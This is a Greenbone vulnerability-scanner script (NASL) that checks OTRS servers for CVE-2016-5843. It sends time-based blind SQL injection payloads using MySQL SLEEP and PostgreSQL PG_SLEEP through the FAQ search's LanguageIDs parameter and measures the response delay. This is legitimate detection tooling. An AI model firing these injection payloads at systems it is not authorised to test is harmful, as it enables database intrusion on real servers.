# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:otrs:otrs";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106290");
  script_version("2025-07-18T05:44:10+0000");
  script_tag(name:"last_modification", value:"2025-07-18 05:44:10 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2016-09-27 11:26:32 +0700 (Tue, 27 Sep 2016)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-11-28 20:29:00 +0000 (Mon, 28 Nov 2016)");

  script_cve_id("CVE-2016-5843");

  script_name("OTRS FAQ Package Multiple SQLi Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_otrs_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("otrs/http/detected");

  script_tag(name:"summary", value:"The FAQ package of OTRS is prone to multiple SQL injection
  (SQLi) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to inject a SQL statement and checks the response.");

  script_tag(name:"insight", value:"Multiple parameters in search query of the FAQ package are
  vulnerable to SQL injection.");

  script_tag(name:"impact", value:"An attacker could access and manipulate the database with an
  HTTP request.");

  script_tag(name:"solution", value:"Update the FAQ package to version 2.3.6, 4.0.5, 5.0.5 or
  later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.otrs.com/security-advisory-2016-01-security-update-otrs-faq-package/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(port: port, item: dir + "/public.pl?Action=PublicFAQExplorer");
start = unixtime();
res = http_keepalive_send_recv(port: port, data: req);
stop = unixtime();
if ("<title>FAQ -" >!< res)
  exit(0);

latency = stop - start;

url = dir + '/public.pl';

count = 0;

foreach sleep (make_list(3, 5, 7)) {

  # MySQL
  query = "2) AND (SELECT * FROM (SELECT(SLEEP(" + sleep + ")))nwrQ) AND (4570=4570";
  data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
          query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
          "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
          "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
          "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
          "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
  req = http_post_put_req(port: port, url: url, data: data,
                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  start = unixtime();
  res = http_keepalive_send_recv(port: port, data: req);
  stop = unixtime();

  time = stop - start;
  if (time >= sleep && time <= (sleep + latency)) {
    count++;
  }
}

if (count >= 2) {
  report = 'It was possible to conduct a blind SQL-Injection (MySQL: sleep) into the "LanguageIDs" parameter via a crafted POST request to the following URL:\n\n' + http_report_vuln_url(url: url, port: port, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

count = 0;

foreach sleep (make_list(3, 5, 7)) {

  # PostgreSQL
  query = "2) AND 9372=(SELECT 9372 FROM PG_SLEEP(" + sleep + ")) AND (4256=4256";
  data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
          query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
          "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
          "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
          "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
          "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
  req = http_post_put_req(port: port, url: url, data: data,
                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  start = unixtime();
  res = http_keepalive_send_recv(port: port, data: req);
  stop = unixtime();

  time = stop - start;
  if (time >= sleep && time <= (sleep + latency)) {
    count++;
  }
}

if (count >= 2) {
  report = 'It was possible to conduct a blind SQL-Injection (PostgreSQL: pg_sleep) into the "LanguageIDs" parameter via a crafted POST request to the following URL:\n\n' + http_report_vuln_url(url: url, port: port, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
